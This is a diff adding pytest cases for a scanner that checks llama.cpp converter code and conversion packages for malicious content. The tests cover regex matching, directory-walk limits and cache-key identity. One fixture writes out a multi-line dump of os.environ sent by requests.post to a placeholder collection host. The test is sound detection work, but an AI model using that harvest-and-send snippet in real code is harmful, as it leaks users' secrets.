@@ -535,6 +535,60 @@ def test_pattern_evaluation_agrees_with_the_pinned_patterns(scan):
     assert mismatches == [], mismatches[:3]
 
 
+def test_one_dot_star_alternative_does_not_put_the_others_on_the_line_path(scan):
+    """per_line was one flag for the whole pattern.
+
+    A single alternative carrying a non-DOTALL `.*` forced EVERY alternative to
+    be evaluated one line at a time, including ones that legitimately span lines
+    through `\\s*`. In RE_ENV_HARVEST the last two carry the `.*` and the third is
+    `json.dumps(\\s*os.environ`, so a harvest written across three lines matched
+    re.search and not _matches: paired with a network send that is a finding the
+    scan dropped, in strict mode too.
+    """
+    harvest = "payload = json.dumps(\n    os.environ\n)\n"
+    assert scan.RE_ENV_HARVEST.search(harvest), "the fixture must match the real pattern"
+    assert scan._matches(scan.RE_ENV_HARVEST, harvest)
+
+    # The flags stay per alternative, and this pattern really does mix the two.
+    flags = scan._evaluator(scan.RE_ENV_HARVEST)[1]
+    assert True in flags and False in flags, flags
+
+    # End to end: the dropped finding comes back.
+    source = (
+        b"import json, os, requests\n"
+        b"payload = json.dumps(\n"
+        b"    os.environ\n"
+        b")\n"
+        b"requests.post('http://example.invalid/collect', data=payload)\n"
+    )
+    findings = scan.scan_converter_source(source, "convert_hf_to_gguf.py")
+    assert findings, "a multi-line environment harvest plus a network send is a finding"
+
+
+def test_a_multiline_subject_agrees_with_re_search_on_every_pattern(scan):
+    """The existing fuzz joins short tokens, so it rarely builds a subject whose
+    match spans a newline through `\\s*`. This aims at that case directly: for each
+    pattern, take the text its own alternatives describe and break it across
+    lines at every whitespace-tolerant point."""
+    import re as _re
+
+    mismatches = []
+    for name, pattern in scan.VENDORED_PATTERNS.items():
+        for alternative in scan._split_top_level_alternatives(pattern.pattern):
+            text = alternative if isinstance(alternative, str) else alternative.decode()
+            if "\\s*" not in text or ".*" in text:
+                continue
+            # A literal subject for this alternative, with each \s* spelled "\n".
+            subject = _re.sub(r"\\s\*", "\n", text)
+            subject = subject.replace("\\b", "").replace("\\(", "(").replace("\\)", ")")
+            subject = subject.replace("\\.", ".").replace("\\s+", " ")
+            if _re.search(r"[\[\]\(\)\?\+\*\|]", subject):
+                continue      # still regex, not a subject; skip rather than guess
+            if bool(pattern.search(subject)) != scan._matches(pattern, subject):
+                mismatches.append((name, subject))
+    assert mismatches == [], mismatches[:3]
+
+
 @pytest.mark.parametrize(
     "name,filler",
     [
@@ -813,7 +867,7 @@ def test_a_nested_module_in_the_conversion_package_is_scanned(tmp_path, monkeypa
 
     assert "nested/__init__.py" in llama_cpp._conversion_package_modules(
         str(root / "conversion")
-    )
+    )[0]
 
     monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
     monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
@@ -903,7 +957,7 @@ def test_a_payload_behind_a_symlinked_subpackage_is_scanned(tmp_path, monkeypatc
     except (OSError, NotImplementedError):
         pytest.skip("this filesystem does not allow creating directory symlinks")
 
-    assert "linked/__init__.py" in llama_cpp._conversion_package_modules(str(conversion))
+    assert "linked/__init__.py" in llama_cpp._conversion_package_modules(str(conversion))[0]
 
     monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
     monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
@@ -927,7 +981,7 @@ def test_a_symlink_loop_in_the_package_terminates(tmp_path):
     except (OSError, NotImplementedError):
         pytest.skip("this filesystem does not allow creating directory symlinks")
 
-    names = llama_cpp._conversion_package_modules(str(conversion))
+    names, complete = llama_cpp._conversion_package_modules(str(conversion))
 
     # Terminating at all is the claim; the module is found once through the real
     # path, and the loop contributes at most the one pass before it is noticed.
@@ -965,7 +1019,9 @@ def test_the_walk_stops_once_the_cap_is_known_to_be_crossed(tmp_path, monkeypatc
 
     monkeypatch.setattr(llama_cpp.os, "walk", counting_walk)
     limit = llama_cpp.MAX_CONVERSION_PACKAGE_FILES + 1
-    names = llama_cpp._conversion_package_modules(str(conversion), limit = limit)
+    names, complete = llama_cpp._conversion_package_modules(
+        str(conversion), file_limit = limit,
+    )
 
     assert len(names) == limit
     assert len(visited) <= limit + 1, (
@@ -975,7 +1031,91 @@ def test_the_walk_stops_once_the_cap_is_known_to_be_crossed(tmp_path, monkeypatc
     # Unbounded by default, so a caller that has not asked for a bound still gets
     # the whole tree rather than a silently truncated one.
     visited.clear()
-    assert len(llama_cpp._conversion_package_modules(str(conversion))) == total
+    assert len(llama_cpp._conversion_package_modules(str(conversion))[0]) == total
+
+
+def test_a_tree_that_is_huge_without_being_python_is_still_bounded(
+    tmp_path, monkeypatch, caplog
+):
+    """Counting .py files bounds what gets READ, not what gets WALKED.
+
+    Sixty modules and a very large number of other entries never reaches the file
+    cap, so the whole attacker-sized directory was traversed anyway -- and
+    _conversion_sibling_info re-walks it before every cached export.
+    """
+    llama_cpp = _load("llama_cpp_entry_bound_probe", "unsloth_zoo/llama_cpp.py")
+
+    root = tmp_path / "llama.cpp"
+    conversion = root / "conversion"
+    conversion.mkdir(parents = True)
+    (conversion / "__init__.py").write_text("X = 1\n", encoding = "utf-8")
+    (conversion / "base.py").write_text("Y = 1\n", encoding = "utf-8")
+    # Well past the entry budget, and holding no Python at all.
+    entries = llama_cpp.MAX_CONVERSION_PACKAGE_ENTRIES * 2
+    for index in range(entries):
+        (conversion / f"blob_{index:05d}.bin").write_bytes(b"")
+
+    visited = []
+    real_walk = os.walk
+
+    def counting_walk(top, *args, **kwargs):
+        for entry in real_walk(top, *args, **kwargs):
+            visited.append(entry[0])
+            yield entry
+
+    monkeypatch.setattr(llama_cpp.os, "walk", counting_walk)
+    names, complete = llama_cpp._conversion_package_modules(
+        str(conversion),
+        file_limit = llama_cpp.MAX_CONVERSION_PACKAGE_FILES + 1,
+        entry_limit = llama_cpp.MAX_CONVERSION_PACKAGE_ENTRIES,
+    )
+    assert len(names) <= llama_cpp.MAX_CONVERSION_PACKAGE_FILES
+    assert complete is False, "an oversized tree must not report itself fully walked"
+
+    # Too few modules to trip the file cap, so only the entry budget can report
+    # this, and unread has to be said out loud rather than passing as clean.
+    monkeypatch.delenv("UNSLOTH_CONVERTER_SCAN_STRICT", raising = False)
+    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
+    caplog.clear()
+    with caplog.at_level(logging.WARNING):
+        llama_cpp._scan_conversion_package(str(root))
+    assert any("directory entries" in record.message for record in caplog.records), (
+        f"the unwalkable package was not reported: {[r.message for r in caplog.records]}"
+    )
+
+    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
+    with pytest.raises(llama_cpp.ConverterScanError, match = "directory entries"):
+        llama_cpp._scan_conversion_package(str(root))
+
+
+def test_the_cache_key_moves_when_the_bytes_do_under_a_preserved_mtime(tmp_path):
+    """(path, mtime, size) is not an identity for a file.
+
+    Replacing a module with same-sized content and restoring its mtime left the
+    key identical, so a long-lived process returned the cached patcher without
+    rescanning and the subprocess imported bytes nothing had read. A metadata
+    copy away from deliberate, and free on a coarse-timestamp filesystem.
+    """
+    llama_cpp = _load("llama_cpp_key_identity_probe", "unsloth_zoo/llama_cpp.py")
+
+    root = tmp_path / "llama.cpp"
+    conversion = root / "conversion"
+    conversion.mkdir(parents = True)
+    (conversion / "__init__.py").write_text("X = 1\n", encoding = "utf-8")
+    module = conversion / "base.py"
+    module.write_text("VALUE = 1\n", encoding = "utf-8")
+    stamp = os.stat(module)
+
+    before = llama_cpp._conversion_sibling_info(str(root))
+    assert before is not None
+
+    # Same length, same mtime, different bytes.
+    module.write_text("VALUE = 9\n", encoding = "utf-8")
+    os.utime(module, ns = (stamp.st_atime_ns, stamp.st_mtime_ns))
+    assert os.stat(module).st_mtime_ns == stamp.st_mtime_ns
+    assert os.stat(module).st_size == stamp.st_size
+
+    assert llama_cpp._conversion_sibling_info(str(root)) != before
 
 
 def test_a_package_within_the_cap_says_nothing_about_size(tmp_path, monkeypatch, caplog):
